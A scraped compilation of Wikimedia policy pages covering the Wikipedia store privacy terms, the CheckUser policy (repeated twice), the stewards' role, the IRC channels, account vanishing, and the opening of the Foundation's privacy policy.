We use Personal Information to operate the Wikipedia store and to fulfill your requests.  This includes: 

 * Supporting and facilitating your shopping in the Wikipedia store;
 * Completing your transactions and providing you with related customer service;
 * Supporting user account functionality; and
 * Sending administrative information to you, such as changes to our terms and conditions. 

We engage in the foregoing activities to manage our contractual relationship with you or because we have a legitimate interest.

We also use Personal Information to send you news and other marketing materials related to our activities. This includes:

 * Communicating with you about the Wikipedia store and products, as well as other Wikimedia projects.

We engage in this activity with your consent, where required by law, or where we have a legitimate interest.

Additionally, we use Personal Information in support of our organizational mission and objectives. This includes: 

 * Supporting, facilitating and analyzing the operations of the Wikipedia store and the Wikimedia Foundation; and
 * Developing new products and services, and enhancing, improving or modifying our current products and services.

We engage in the foregoing activities to comply with legal obligations or because we have a legitimate interest.

We may use Other Information for any purpose, except where we are required to do otherwise under applicable law. In some instances, we combine Other Information with Personal Information. If we do, we will treat the combined information as Personal Information as long as it is combined.

 3. When we disclose your information

 We disclose Personal Information:

 * To our third-party service providers, to facilitate services they provide to us, such as website hosting, data analysis, payment processing, order fulfillment, information technology and related infrastructure provision, customer service email delivery, auditing, and other services.

 4. Other uses and disclosures
    
    

We also use and disclose your Personal Information to public authorities and other persons as necessary or appropriate, especially when we have a legal obligation or legitimate interest to do so:

 * To comply with applicable law and regulations (including outside of your country of residence);
 * To cooperate with public and government authorities or law enforcement (including outside of your country of residence). For example, on certain rare occasions, we may respond to law enforcement requests and orders or provide information we believe is important;
 * For other legal reasons. For example, we may disclose your Personal Information to enforce our terms and conditions or protect our rights, privacy, safety or property, and/or yours, and/or that of others; and
 * In connection with a sale or business transaction. In the extremely unlikely event that ownership of all or substantially all of the Wikimedia Foundation changes, or we undergo a reorganization (such as a merger, acquisition, consolidation or dissolution), we may disclose or transfer your Personal Information to a third party.

 5. Your choices 

You may provide us your name and email address to receive useful information such as educational and promotional materials. These are “opt-in” interactions which require you to sign-up to receive communications from us. You can unsubscribe from future mailings at any time by going to our Unsubscribe Page. These direct communications may be performed with the help of a third party service provider, who may interact with and manage database information (including Personal Information) on our behalf.

If you would like to access, correct, update, suppress, restrict or delete the Personal Information we have about you, object to our processing of such Personal Information or if you would like to request to receive an electronic copy of your Personal Information for purposes of transmitting it to another organization (to the extent this right is provided to you by applicable law), or if you would like to change your communication preferences, you can let us know by contacting us as described in “Some final words,” below. While we will make reasonable efforts to comply with your request, there are certain situations where we will not grant your request (such as when we cannot adequately verify your identity to give you access to Personal Information, when we are legally required to retain information, or when we are not technologically able to change or delete Personal Information at that time).

 6. Our retention of Personal Information

We seek to retain Personal Information for as long as needed, in light of the purpose(s) for which it was obtained.

 7. Security

We use reasonable security procedures designed to protect Personal Information from loss, misuse or alteration of the information under our control. Although we make good faith efforts to control information, we cannot guarantee the complete security of your information. 

 8. Jurisdictional issues

Wikimedia Foundation, Inc. and the Wikipedia store are based in the United States of America. Your Personal Information may be stored and processed in the United States and any other country where we have facilities or in which we engage third party service providers, and by using the Wikipedia store you understand that your Personal Information will be transferred to the United States and other countries outside of your country of residence, which may have data protection rules that are different from those of your country.

The following page documents an official global policy.
This page has been developed and approved by the community and its compliance is mandatory for all projects. It must not be modified without prior community approval.

←Policies and guidelines
CheckUser policy

This page provides information about CheckUser access and outlines the policy on its use. It was discussed in September and October 2005, and went live in November 2005.




CHECKUSER STATUS

CheckUser is an interface for users with the checkuser permission. A user with the checkuser permission on a wiki can, in particular, check if a user is a sockpuppet of another user on that wiki (not on all wikis). By using it, users are able to:

 * Determine from which IP addresses an account has performed edits, logged actions, or password resets on the Wikimedia wiki;
 * Determine all edits, logged actions, login attempts, and password resets that were performed on the Wikimedia wiki from a specific IP address (including users who were logged in with an account);
 * Determine whether the account being checked has sent an email using the MediaWiki interface to any other user. The time of the event is logged; the destination email address and destination account is obscured.

This information is only stored for a short period (currently 90 days), so edits made prior to that will not be shown via the CheckUser tool. A log is kept of who has made queries using the tool. This log is available to those with the checkuser-log permission:

 * 01:55, 13 April 2025 CheckUser got IP addresses for Example (talk | contribs | block) (a very good reason for looking at their IPs)
 * 01:55, 13 April 2025 CheckUser got users for 127.0.0.1 (another good reason)

See Help:CheckUser for the user manual.


USE OF THE TOOL

The tool is to be used to fight vandalism, spamming, to check for sockpuppet abuse, and to limit disruption of the project. It must be used only to prevent damage to any of the Wikimedia projects.

The tool should not be used for political control, to apply pressure on editors, or as a threat against another editor in a content dispute. There must be a valid reason to use the CheckUser tools to investigate a user. Note that alternative accounts are not forbidden, so long as they are not used in violation of the policies (examples of violations include double-voting, increasing the apparent support for any given position, or to evade blocks or bans).

Notification to the account that is checked is permitted but is not mandatory. Similarly, notification of the check to the community is not mandatory, but may be done subject to the provisions of the privacy policy.

Some wikis allow an editor's IPs to be checked upon their request if, for example, there is a need to provide evidence of innocence against a sockpuppet allegation; note, however, that requesting a CheckUser in these circumstances is sometimes part of the attempt to disrupt.


PRIVACY POLICY

Main articles: Privacy policy and Access to nonpublic personal data policy

On Wikimedia projects, privacy policy considerations are of tremendous importance. Unless someone is violating policy with their actions (e.g. massive bot vandalism or spam) and revealing information about them is necessary to stop the disruption, it is a violation of the privacy policy to reveal their IP, whereabouts, or other information sufficient to identify them, unless they have already revealed this information themselves on the project.


INFORMATION RELEASE

Even if the user is committing abuse, it's best not to reveal personal information if possible.

 * Generally, do not reveal IPs. Only give information such as same network/not same network or similar. If detailed information is provided, make sure the person you are giving it to is a trusted person and will not reveal it himself/herself.
 * If the user has said they're from somewhere and the IP confirms it, it's not releasing private information to confirm it if needed.
 * If you're in any doubt, give no detail.


ACCESS TO CHECKUSER

Approved candidates for CheckUser permissions must sign, before being granted such permissions, a confidentiality agreement for nonpublic information pursuant the access to nonpublic personal data policy.

Only stewards, ombuds, some Wikimedia Foundation staff, and a very small number of other users are allowed to have CheckUser access. Users can only have CheckUser status locally (except for the ombuds and those staff members with access).

If local CheckUsers exist in a project, checks should generally be handled by those. In emergencies, or for multi-project CheckUser checks (as in the case of cross-wiki vandalism), stewards may perform local checks. Stewards should remove their own CheckUser access on the projects upon completion of the checks and notify the local CheckUsers or the CheckUser e-mail list.

If no local CheckUsers exist for a project, requests will need to be made to the stewards to perform checks (such as "is UserX a sockpuppet of UserY"). To do so, simply add the request to Steward requests/Checkuser listing these users and explain the need for the check (with links). Depending on the nature of the request, the steward may deny it, may ask for more information, or may answer about the likelihood of the users in question having the same IP, same proxy, same network, same country, or being completely unrelated (see discussion for what the steward should more precisely say to the editor).


APPOINTING LOCAL CHECKUSERS

On any wiki, there must be at least two users with CheckUser status, or none at all. This is so that they can mutually control and confirm their actions. In the case where only one CheckUser is left on a wiki (when the only other one retires, or is removed), the community must appoint a new CheckUser immediately (so that the number of CheckUsers is at least two).

On wikis with an Arbitration Committee (ArbCom) whose members have been elected with the support of at least 25–30 members of the local community, CheckUsers may be directly appointed by the Arbitrators. After agreement, a member of the Committee should simply list the candidate on Steward requests/Permissions.

On a wiki without an Arbitration Committee that meets the criterion above, or in a project where there is a preference for independent elections, the community may approve local CheckUsers (stewards not counting as local CheckUsers) per consensus. The candidate must request the CheckUser status within the local community and advertise this request properly (village pump, mailing list when available, special request page, etc.). The candidate must be familiar with the privacy policy. After gaining consensus (at least 70%–80% in pro/con voting or the highest number of votes in multiple choice elections) in the local community, and with at least 25–30 editors' approval, the successful candidate should request access at Steward requests/Permissions with a link to the page with the community's decision. If there are an insufficient number of votes for at least two CheckUsers on a wiki, there will be no CheckUsers on that wiki.


MAILING LIST

There is a closed mailing list (CheckUser-l) to which all stewards and CheckUsers should have access. Email the list moderators to gain access. Use this mailing list to ask for help, ideas and second opinions if you're not sure what the data means.


IRC CHANNEL

There is a private IRC channel (#wikimedia-checkuserconnect) to which all stewards and CheckUsers who use IRC should have access. This channel serves the same purpose as the mailing list, but in real-time. Contact any channel member to gain access; a channel manager will grant permanent access. Ask a steward if you need help gaining access.


REMOVAL OF ACCESS

Any user account with CheckUser status that is inactive for more than one year will have their CheckUser access removed.

In case of abusive use of the tool, the steward or the editor with the CheckUser privilege will immediately have their access removed. This will in particular happen if checks are done routinely on editors without a serious motive to do so (links and proofs of bad behavior should be provided).

Suspicion of abuses of CheckUser should be discussed by each local wiki. On wikis with an approved ArbCom, the ArbCom can decide on the removal of access. On wikis without an approved ArbCom, the community can vote removal of access.

Complaints of infringement of CheckUser, Access to Nonpublic Information Policy or Privacy Policy breaches are handled by the Ombuds commission for all Wikimedia projects.

Noticeboards

 * Stewards' noticeboard

Stewards are a global group of users who have complete access to the wiki interface on all public Wikimedia wikis. They have the technical ability to modify all local and global user rights, change the status and name of global accounts, and access any of the permissions available to administrators and bureaucrats. The use of steward rights is restricted by policy; stewards will not use their technical access when there are local users who can use that access, except in emergencies. This enables them to act as administrators and bureaucrats on projects without any local administrators or bureaucrats.

Stewards are elected or confirmed by the global Wikimedia community through yearly steward elections held between January and March. Stewards are volunteers, meaning that they do not work for the Wikimedia Foundation in this responsibility. Stewards are also not arbitrators or mediators; to resolve a conflict on a small project, please attempt local resolution, and file a request for comment on Meta-Wiki if local resolution cannot be achieved. For systemic failure reach out to the Universal Code of Conduct Coordinating Committee.

There are currently 34 stewards in the Wikimedia movement.


HISTORY

Main article: Stewards/History

The steward group was created in 2004 in order to separate user rights management from software development and systems administration. Stewards were initially only given the ability to modify all user rights through Meta-Wiki. Before the creation of the steward group, developers were needed to modify user rights on wikis without local bureaucrats.

Stewards were given the responsibility of managing global accounts when the CentralAuth extension was implemented in 2008. When the single-user login finalization was completed in 2015, they also became responsible for renaming global accounts – a responsibility shared with global renamers.

The first elections were held in 2004, with annual or semi-annual elections happening in subsequent years. The last year with two elections was 2011.


MEMBERSHIP

Main article: Stewards/Elections

Steward elections are held between January and February every year, with voting lasting for three weeks in February. Candidates must meet account and activity requirements, including holding administrator rights on one Wikimedia wiki for at least three months, and made 600 edits, with 50 made within the last six months. Voting is also restricted to users with 600 edits and 50 in the last six months. Candidates are elected by a vote, requiring 80% support and at least 30 supporting votes to be elected. There is no limit to the number of users that can hold steward rights, or the number of stewards that can be elected during each election cycle. Because stewards can access personal information and suppressed data, stewards also need to sign a confidentiality agreement.


CONFIRMATIONS

Existing stewards are confirmed every year at the same time as the elections. The first stage of the confirmations is a community comment period, where any user is free to comment for or against any of the current stewards. These comments should be directed specifically at the use of the steward permissions, or at other relevant factors for whether a steward should retain or lose their permissions. After the community comment period is closed, all new and existing stewards deliberate on the results. A steward is removed if a majority of other stewards vote for removal in the deliberations.


REMOVAL OF ACCESS

Stewards are automatically removed for inactivity if they have performed no actions within the past six months, and less than ten actions within the last year.


ACCESS

Stewards are primarily responsible for performing the following technical actions:

Global account management
 * Lock and unlock global accounts
 * Hide and suppress global accounts
 * Rename global accounts and local unattached accounts
 * Globally block and unblock IP addresses and accounts
 * Use the CheckUser tool on login.wikimedia.org (statistics)

User rights management
 * Assign and remove all local user rights on any account on any Wikimedia wiki
   * Bot, administrator, interface administrator and bureaucrat rights are assigned on wikis without local bureaucrats
   * CheckUser, oversight, and import rights are only assigned by stewards
 * Assign and remove all global user rights
 * Manage global group permissions and wikisets

Miscellaneous
 * Approve, disable, and suppress OAuth application requests
 * Use any administrator, CheckUser, or oversighter access on wikis without local users in those permissions groups
 * Respond to VRT tickets in the stewards' queue, or any of the information queues
 * Delete pages with greater than 5,000 revisions
 * Create and edit global abusefilters

Stewards are also responsible for the following non-technical actions:

 * Closing and implementing requests for global community bans
 * Acting as scrutineers for Arbitration Committee elections on some wikis
 * Working with Wikimedia Foundation staff as the first point of contact with the community


POLICIES

Main article: Stewards policy

Stewards are required to follow established community policies when using their permissions, and where policies do not exist, established practices are followed instead.

On wikis with local administrators or bureaucrats, stewards typically will not use their access unless there is an emergency. There is some leeway in policy for cross-wiki actions, but this is rarely applied.

User rights are not changed by stewards on wikis where they are an active member of the local community. This maintains the steward role as global in scope, and prevents them from becoming super-users of their home projects. Some permissions that are not held by local users and are uncontroversial to use, such as deleting pages with over 5,000 revisions using the bigdelete permission, are still used by stewards on their home projects.

Stewards are never compelled to take an action; as volunteers, they can always personally recuse from handling a request. They are also free to maintain and express their own opinions, so long as their use of the steward rights conforms with policy.


COMMUNICATION

There are a number of ways to contact stewards, either individually or as a group:

 * Email (normal): stewardswikimedia.org or by using Special:Contact/Stewards
 * Email (oversight requests): stewards-oversightwikimedia.org or by using Special:EmailUser/Wikimedia Stewards (Oversight).
 * Email (lock appeals): stewards-appealswikimedia.org.
 * IRC: #wikimedia-stewards – Add @steward before your request to ping all stewards currently in the channel
 * Meta: Stewards' noticeboard or Steward requests
   * Steward requests/Permissions for requests for local user rights
   * Steward requests/Bot status for bot permissions requests
   * Steward requests/Global permissions for requests for global user rights
   * Steward requests/Global for global locking and blocking requests
   * Steward requests/Username changes for account rename and username usurpation requests
   * Steward requests/Miscellaneous for other requests, including bigdelete and OAuth app approval
 * Individually, using the contact information provided in the list below

There is a private steward mailing list (Stewards-l) and wiki (steward.wikimedia.org) used for internal communication and organization.

Wikimedia IRC has been migrated from freenode to Libera.Chat. For more information, please see IRC/Migrating to Libera Chat. References to freenode on this page and others may be out of date.

This external system is not subject to the WMF Privacy Policy.

For real-time chat with other Wikimedians, there are several Internet Relay Chat (IRC) channels on the Libera Chat network. #wikipedia-en is the main forum (see here for other channels); these are the responsibility of, and controlled by, the Group Contacts.

Channels located on the Freenode network will not be maintained by the IRC Group Contacts.

The recent changes channels are now located on the Wikimedia IRC network (irc.wikimedia.org:6667). A channel exists for each public Wikimedia wiki which has been changed since the last time the server was restarted. In general, the name is just the domain name with the .org left off. For example, the changes on the English Wikipedia are available at #en.wikipedia. However, some wikis which are not Wikipedias have the .wikipedia suffix (e.g. #mediawiki.wikipedia for MediaWiki.org). See IRC/Channels#Raw feeds for details.

irc.wikimedia.org is deprecated in favor of EventStreams

NICKNAMES

On IRC/Nicks you'll find a list of people whose nickname on IRC is different from their Wikimedia username.

Many IRC clients allow automated login upon connection. Usually, this is done by entering the username and password (or just password) as the "server password" in the client's settings. Some clients must be closed and restarted to recognize a server password or change of one; just disconnect/reconnect alone won't do it.


HOSTMASK CLOAKS

IRC hostmask cloaks allow a user to replace their IRC hostname with a string such as wikimedia/JamesF. User cloaks allow you to show off your pride as a Wikipedia editor, casually hide your IP address from view from logged clients, and prove that you are the user on Wikipedia with that user name. For more information, including instructions on how to obtain a cloak, see IRC cloaks.

The following page documents an official global policy.
This page has been developed and approved by the community and its compliance is mandatory for all projects. It must not be modified without prior community approval.

←Policies and guidelines
CheckUser policy

This page provides information about CheckUser access and outlines the policy on its use. It was discussed in September and October 2005, and went live in November 2005.




CHECKUSER STATUS

CheckUser is an interface for users with the checkuser permission. A user with the checkuser permission on a wiki can, in particular, check if a user is a sockpuppet of another user on that wiki (not on all wikis). By using it, users are able to:

 * Determine from which IP addresses an account has performed edits, logged actions, or password resets on the Wikimedia wiki;
 * Determine all edits, logged actions, login attempts, and password resets that were performed on the Wikimedia wiki from a specific IP address (including users who were logged in with an account);
 * Determine whether the account being checked has sent an email using the MediaWiki interface to any other user. The time of the event is logged; the destination email address and destination account is obscured.

This information is only stored for a short period (currently 90 days), so edits made prior to that will not be shown via the CheckUser tool. A log is kept of who has made queries using the tool. This log is available to those with the checkuser-log permission:

 * 01:55, 13 April 2025 CheckUser got IP addresses for Example (talk | contribs | block) (a very good reason for looking at their IPs)
 * 01:55, 13 April 2025 CheckUser got users for 127.0.0.1 (another good reason)

See Help:CheckUser for the user manual.


USE OF THE TOOL

The tool is to be used to fight vandalism, spamming, to check for sockpuppet abuse, and to limit disruption of the project. It must be used only to prevent damage to any of the Wikimedia projects.

The tool should not be used for political control, to apply pressure on editors, or as a threat against another editor in a content dispute. There must be a valid reason to use the CheckUser tools to investigate a user. Note that alternative accounts are not forbidden, so long as they are not used in violation of the policies (examples of violations include double-voting, increasing the apparent support for any given position, or to evade blocks or bans).

Notification to the account that is checked is permitted but is not mandatory. Similarly, notification of the check to the community is not mandatory, but may be done subject to the provisions of the privacy policy.

Some wikis allow an editor's IPs to be checked upon their request if, for example, there is a need to provide evidence of innocence against a sockpuppet allegation; note, however, that requesting a CheckUser in these circumstances is sometimes part of the attempt to disrupt.


PRIVACY POLICY

Main articles: Privacy policy and Access to nonpublic personal data policy

On Wikimedia projects, privacy policy considerations are of tremendous importance. Unless someone is violating policy with their actions (e.g. massive bot vandalism or spam) and revealing information about them is necessary to stop the disruption, it is a violation of the privacy policy to reveal their IP, whereabouts, or other information sufficient to identify them, unless they have already revealed this information themselves on the project.


INFORMATION RELEASE

Even if the user is committing abuse, it's best not to reveal personal information if possible.

 * Generally, do not reveal IPs. Only give information such as same network/not same network or similar. If detailed information is provided, make sure the person you are giving it to is a trusted person and will not reveal it himself/herself.
 * If the user has said they're from somewhere and the IP confirms it, it's not releasing private information to confirm it if needed.
 * If you're in any doubt, give no detail.


ACCESS TO CHECKUSER

Approved candidates for CheckUser permissions must sign, before being granted such permissions, a confidentiality agreement for nonpublic information pursuant the access to nonpublic personal data policy.

Only stewards, ombuds, some Wikimedia Foundation staff, and a very small number of other users are allowed to have CheckUser access. Users can only have CheckUser status locally (except for the ombuds and those staff members with access).

If local CheckUsers exist in a project, checks should generally be handled by those. In emergencies, or for multi-project CheckUser checks (as in the case of cross-wiki vandalism), stewards may perform local checks. Stewards should remove their own CheckUser access on the projects upon completion of the checks and notify the local CheckUsers or the CheckUser e-mail list.

If no local CheckUsers exist for a project, requests will need to be made to the stewards to perform checks (such as "is UserX a sockpuppet of UserY"). To do so, simply add the request to Steward requests/Checkuser listing these users and explain the need for the check (with links). Depending on the nature of the request, the steward may deny it, may ask for more information, or may answer about the likelihood of the users in question having the same IP, same proxy, same network, same country, or being completely unrelated (see discussion for what the steward should more precisely say to the editor).


APPOINTING LOCAL CHECKUSERS

On any wiki, there must be at least two users with CheckUser status, or none at all. This is so that they can mutually control and confirm their actions. In the case where only one CheckUser is left on a wiki (when the only other one retires, or is removed), the community must appoint a new CheckUser immediately (so that the number of CheckUsers is at least two).

On wikis with an Arbitration Committee (ArbCom) whose members have been elected with the support of at least 25–30 members of the local community, CheckUsers may be directly appointed by the Arbitrators. After agreement, a member of the Committee should simply list the candidate on Steward requests/Permissions.

On a wiki without an Arbitration Committee that meets the criterion above, or in a project where there is a preference for independent elections, the community may approve local CheckUsers (stewards not counting as local CheckUsers) per consensus. The candidate must request the CheckUser status within the local community and advertise this request properly (village pump, mailing list when available, special request page, etc.). The candidate must be familiar with the privacy policy. After gaining consensus (at least 70%–80% in pro/con voting or the highest number of votes in multiple choice elections) in the local community, and with at least 25–30 editors' approval, the successful candidate should request access at Steward requests/Permissions with a link to the page with the community's decision. If there are an insufficient number of votes for at least two CheckUsers on a wiki, there will be no CheckUsers on that wiki.


MAILING LIST

There is a closed mailing list (CheckUser-l) to which all stewards and CheckUsers should have access. Email the list moderators to gain access. Use this mailing list to ask for help, ideas and second opinions if you're not sure what the data means.


IRC CHANNEL

There is a private IRC channel (#wikimedia-checkuserconnect) to which all stewards and CheckUsers who use IRC should have access. This channel serves the same purpose as the mailing list, but in real-time. Contact any channel member to gain access; a channel manager will grant permanent access. Ask a steward if you need help gaining access.


REMOVAL OF ACCESS

Any user account with CheckUser status that is inactive for more than one year will have their CheckUser access removed.

In case of abusive use of the tool, the steward or the editor with the CheckUser privilege will immediately have their access removed. This will in particular happen if checks are done routinely on editors without a serious motive to do so (links and proofs of bad behavior should be provided).

Suspicion of abuses of CheckUser should be discussed by each local wiki. On wikis with an approved ArbCom, the ArbCom can decide on the removal of access. On wikis without an approved ArbCom, the community can vote removal of access.

Complaints of infringement of CheckUser, Access to Nonpublic Information Policy or Privacy Policy breaches are handled by the Ombuds commission for all Wikimedia projects.

This page in a nutshell: Account vanishing is one of the ways to indicate a permanent leave from Wikimedia project, similar to "close account" in some other websites. It may remove your (user)name from history of pages you edits, and much other personal information and discussions about user conduct.
 * To preserve attribution, it is not possible to delete an account.
 * Vanishing does not guarantee anonymity. Association may still be easily found in various ways.
 * Even if vanish is intended to be permanent, it may still be reversed.

Are you in the right place?
 * If you want to leave Wikimedia projects but do not care in your past associations or intend to rejoin Wikipedia in the future, simply stop editing. You may optionally add {{Retired}} to your userpage.
 * If you want to edit using another username, you should use changing username and clean start instead.
 * If you want to hide personal information, consider oversight.

The account vanishing process was first proposed on MeatballWiki; see MeatBall:RightToVanish. The principle it embodies is that contributors leaving a project permanently may have any personal contributions unrelated to the core mission of the project removed.[1] It is similar to the WikiMindWipe, but far less reaching. In the context of the Wikimedia Foundation, the term was first used on the English Wikipedia, where it became a customary courtesy before the formation of the Foundation. (See Wikipedia:Courtesy vanishing).

Like the English Wikipedia, most other Wikimedia projects tolerate the "vanishing" of users who wish to leave permanently. Vanishing is not a right or guarantee but rather a courtesy extended to valued contributors who wish to leave. Since contributions are made under the GFDL or CC-BY-SA, which provide an irrevocable license, there is no basis in law or contract for contributors to remove either content they have contributed or attribution for the same.


HOW A REQUEST TO VANISH MAY BE FULFILLED

[edit]
 * Usernames – Usernames cannot normally be deleted, but can sometimes be changed. Even if this is done, it may still be possible to link your new and old names with a minimal degree of work.
 * Work on the project – Your work, including "signatures" (text indicating your authorship of comments) on all but your own user and talk pages, will usually not be changed or removed. To change these would be a major source of disruption. Individual revisions of individual pages that contain personally identifying information may be oversighted instead.
 * User pages, and their subpages, and other non-article pages that no others have substantively contributed to and whose existence does not impact the project, may be courtesy blanked or deleted. User talk pages are rarely deleted.
 * Logs – Administrative and editorial logs showing matters you have been involved with, during your career as an editor, such as your edit history on other pages, will usually remain accessible under your old name.
 * Related matters discussed in more detail below include: making a clean start, removal of personal information from public viewing, and other actions you can take.


PERSONAL INFORMATION AND ITS REMOVAL

[edit]
Main article: Privacy policy

Definition of personal information: Information you provide us or information we collect from you that could be used to personally identify you. To be clear, while we do not necessarily collect all of the following types of information, we consider at least the following to be “personal information” if it is otherwise nonpublic and can be used to identify you:

 * (a) your real name, address, phone number, email address, password, identification number on government-issued ID, IP address, user-agent information, credit card number;
 * (b) when associated with one of the items in subsection (a), any sensitive data such as date of birth, gender, sexual orientation, racial or ethnic origins, marital or familial status, medical conditions or disabilities, political affiliation, and religion; and
 * (c) any of the items in subsections (a) or (b) when associated with your user account.

Two policies govern personal information. Individuals in their role as editors, contributors and readers of Wikimedia projects, should refer to the privacy policy. Information on individuals forming part of an encyclopedia article, are subject to the resolution on biographies of living people. "Account vanishing" relates specifically to the former.

 * The Wikimedia projects will delete personal information about editors and contributors (most likely on user and user talk pages) at their request, provided it is not needed for administrative reasons (which are generally limited to dealing with site misuse issues).
 * Personal information related to encyclopedia articles and persons mentioned therein are not part of this process. Instead, please see the relevant editorial policy on biographical articles, which contains full details of editorial directives, and actions to take if dissatisfied.


ALTERNATIVE MEASURES

[edit]

In general, involuntary disclosure of personal information is dealt with via oversight; there is no need to vanish unless the publicly known information is sufficiently notorious and accessible that oversight is no protection.

Also usernames can often be changed, subject to broad conditions and processes.

If you have used your real name, or a longstanding pen name, on Wikimedia projects then in principle everything you write can be traced to that name, and thus to you, as discussed above. However, if you decide to leave Wikimedia projects, there are a few steps that you can take to weaken that connection. They are:

 1. Change your username to some other name, one which is not directly associated with you (see Changing username).
 2. Change references to your former username to be referenced to your replacement username (you can do this yourself).
 3. Delete your existing user and user subpages (contact an administrator). User talk pages are only deleted in some cases.
 4. While logged in under your old username, create new user and user talk pages for your old account, containing a brief note indicating that you have left Wikimedia projects and asking that people not refer to you by your name.

Be aware that any edits or posts you make, will appear in page history under the account you used at the time. Therefore take care with your login name usage, and be very careful not to edit your old pages or pages you habitually visit, when you are logged in with a name you do not want associated with that account.


HOW TO REQUEST A VANISHING

[edit]

If you wish to vanish, you can use one of the following methods to make your request:

 * The best and fastest way is to visit Special:GlobalVanishRequest to access the vanish request interface. Requests made this way will be processed by global renamers or stewards.
 * You may contact the global renamers via e-mail and ask that your account be renamed, giving "request for courtesy vanishing" as the subject. Please log in then use the contact interface at Special:EmailUser/Wikimedia Global-renamers or email renamerswikimediaorg. If you send the mail directly, you must provide proof that the account is indeed yours.

Notes:

 * Please be aware that all global renames are publicly logged, only the request details are private. A record of requests are kept and can be seen by current renamers, stewards, and Wikimedia Foundation staff.
 * Courtesy vanishing is generally not available for users that are currently locked or blocked.


NOTE

[edit]
 1. ↑ What is deemed to be related to the vision of various projects is left to local discretion, but typically involves a project's informational content rather than its maintenance/administrative side.

Wikimedia Foundation Privacy Policy

This is a summary of the Privacy Policy. To read the full terms, scroll down or click here.
Disclaimer: This summary is not a part of the Privacy Policy and is not a legal document. It is simply a handy reference for understanding the full Privacy Policy. Think of it as the user-friendly interface to our Privacy Policy.


Because we believe that you should not have to provide personal information to participate in the free knowledge movement, you may:

 * Read, edit, or use any Wikimedia Site without registering an account.
 * Register for an account without providing an email address or real name.

Because we want to understand how Wikimedia Sites are used so we can make them better for you, we collect some information when you:

 * Make public contributions.
 * Register an account or update your user page.
 * Use the Wikimedia Sites.
 * Send us emails or participate in a survey or give feedback.

We are committed to:

 * Describing how your information may be used or shared in this Privacy Policy.
 * Using reasonable measures to keep your information secure.
 * Never selling your information or sharing it with third parties for marketing purposes.
 * Only sharing your information in limited circumstances, such as to improve the Wikimedia Sites, to comply with the law, or to protect you and others.
 * Retaining your data for the shortest possible time that is consistent with maintaining, understanding, and improving the Wikimedia Sites, and our obligations under applicable law.

Be aware:

 * Any content you add or any change that you make to a Wikimedia Site will be publicly and permanently available.
 * If you add content or make a change to a Wikimedia Site without logging in, that content or change will be publicly and permanently attributed to the IP address used at the time rather than a username.
 * Our community of volunteer editors and contributors is a self-policing body. Certain administrators of the Wikimedia Sites, who are chosen by the community, use tools that grant them limited access to nonpublic information about recent contributions so they may protect the Wikimedia Sites and enforce policies.
 * This Privacy Policy does not apply to all sites and services run by the Wikimedia Foundation, such as sites or services that have their own privacy policy (like the Wikimedia Shop) or sites or services run by third parties (like third-party developer projects on Wikimedia Cloud Services).
 * As part of our commitment to education and research around the world, we occasionally release public information and aggregated or non-personal information to the general public through data dumps and data sets.
 * For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.

INTRODUCTION


WELCOME!



The Wikimedia Foundation is the nonprofit organization that operates collaborative, free knowledge websites, like Wikipedia, Wikimedia Commons, and Wiktionary.

This Policy explains how we collect, use, and share your Personal Information.

 * We collect very little Personal Information about you.
 * We do not rent or sell your Personal Information to third parties.

By using Wikimedia Sites, you consent to this Policy.

The Wikimedia movement is founded on a simple, but powerful principle: we can do more together than any of us can do alone. We cannot work collectively without gathering, sharing, and analyzing information about our users as we seek new ways to make the Wikimedia Sites more usable, safer, and more beneficial.

We believe that information-gathering and use should go hand-in-hand with transparency. This Privacy Policy explains how the Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, like Wikipedia, collects, uses, and shares information we receive from you through your use of the Wikimedia Sites. It is essential to understand that, by using any of the Wikimedia Sites, you consent to the collection, transfer, processing, storage, disclosure, and use of your information as described in this Privacy Policy. That means that reading this Policy carefully is important.

We believe that you should not have to provide nonpublic Personal Information to participate in the free knowledge movement. You do not have to provide things like your real name, address, or date of birth to sign up for a standard account or contribute content to the Wikimedia Sites.

We do not sell or rent your Personal Information, nor do we give it to others to sell you anything. We use it to figure out how to make the Wikimedia Sites more engaging and accessible, to see which ideas work, and to make learning and contributing more fun. Put simply: we use this information to make the Wikimedia Sites better for you.

After all, it is people like you, the champions of free knowledge, who make it possible for the Wikimedia Sites to not only exist, but also grow and thrive.



DEFINITIONS

Back to top


We recognize that only a minority of you are familiar with technical terms like "tracking pixels" and "cookies" used in the Privacy Policy.

Whether you are brand new to privacy terminology or you are an expert who just wants a refresher, you might find our Glossary of Key Terms helpful.

Because everyone (not just lawyers) should be able to easily understand how and why their information is collected and used, we use common language instead of more formal terms throughout this Policy. To help ensure your understanding of some particular key terms, here is a table of translations:




When we say... ...we mean: "the Wikimedia Foundation" / "the Foundation" / "we" / "us" / "our" The Wikimedia Foundation, Inc., the non-profit organization that operates the Wikimedia Sites. "Wikimedia Sites" / "our services" Wikimedia websites and services (regardless of language), including our main projects, such as Wikipedia and Wikimedia Commons, as well as mobile applications, Application Programming Interfaces (APIs), emails, and notifications; excluding, however, sites and services listed in the "What This Privacy Policy Does Not Cover" section below. "you" / "your" / "me" You, regardless of whether you are an individual, group, or organization, and regardless of whether you are using the Wikimedia Sites or our services on behalf of yourself or someone else. "this Policy" / "this Privacy Policy" This document, entitled the "Wikimedia Foundation Privacy Policy". "contributions" Content you add or changes you make to any Wikimedia Sites. "Personal information" Information you provide us or information we collect that could be used to personally identify you. To be clear, while we do not necessarily collect all of the following types of information, we consider at least the following to be "personal information" if it is otherwise nonpublic and can be used to identify you: (a) your real name, address, phone number, email address, password, identification number on government-issued ID, IP address, user-agent information, payment account number; (b) when associated with one of the items in subsection (a), any sensitive data such as date of birth, gender, sexual orientation, racial or ethnic origins, marital or familial status, medical conditions or disabilities, political affiliation, and religion. "third party" / "third parties" Individuals, entities, websites, services, products, and applications that are not controlled, managed, or operated by the Wikimedia Foundation. This includes other Wikimedia users and independent organizations or groups who help promote the Wikimedia movement such as Wikimedia chapters, thematic organizations, and user groups as well as volunteers, employees, directors, officers, grant recipients, and contractors of those organizations or groups.




WHAT THIS PRIVACY POLICY DOES AND DOES NOT COVER

Except as explained below, this Privacy Policy applies to our collection and handling of information about you that we receive as a result of your use of any of the Wikimedia Sites. This Policy also applies to information that we receive from our partners or other third parties. To understand more about what this Privacy Policy covers, please see below.

Examples of What This Privacy Policy Covers

For the sake of clarity, this Privacy Policy covers, regardless of language:

 * All of our major sites (found at list of major projects), such as Wikipedia, including user pages, discussion pages, and noticeboards.
 * Our blogs and APIs (unless we have provided a separate policy for those services).
